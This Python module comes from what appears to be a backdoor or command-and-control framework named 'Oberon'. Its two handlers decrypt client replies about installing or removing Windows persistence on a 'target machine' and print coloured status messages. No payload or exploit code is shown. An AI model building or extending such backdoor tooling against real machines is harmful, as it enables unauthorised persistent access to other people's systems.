"""Handle persistence related client responses."""

from components.networking import decrypt_message
from components.logging import log_activity
from termcolor import colored

def persist_del_command(client_output, key: bytes) -> str:
    """Handle the result of a persistence removal command."""
    decrypted_client_message = decrypt_message(client_output, key).decode()
    if decrypted_client_message == "no_exist":
        return colored("[-] No persistance is currently active on the machine", "red")
    elif decrypted_client_message == "permission_denied":
        return colored("[-] Unable to delete : Permission Denied", "red")
    
    if decrypted_client_message == "success":
        return colored("[+] Persistance successfully deleted from target machine", "green")
    elif decrypted_client_message == "fail":
        return colored("[-] An unknown error has occured when trying to delete persistance", "red")
    
    return colored("[-] Unable to parse persistance output. This operation may or may not have worked", "red")

def persist_command(client_output, key: bytes) -> str:
    """Handle the result of a persistence installation command."""
    decrypted_client_message = decrypt_message(client_output, key).decode()
    if decrypted_client_message == "created":
        log_activity("Oberon Framework backdoor installed successfully on target machine. Persistance is now active.", "info")
        return colored("[+] Oberon Framework backdoor installed successfully on target machine. Persistance is now active", "green")
    elif decrypted_client_message == "not_windows":
        log_activity("Target is not using a windows machine, persistance will not work.", "error")
        return colored("[-] Target is not using a windows machine, persistance will not work", "red")
    elif decrypted_client_message == "already_created":
        log_activity("Target already has persistance active on machine.", "debug")
        return colored("[-] Target already has persistance active", "red")
    else:        
        log_activity("An unidentified error has occured when attempting to create persistance.", "error")
        return colored("[-] An unidentified error has occured when attempting to create persistance", "red")  
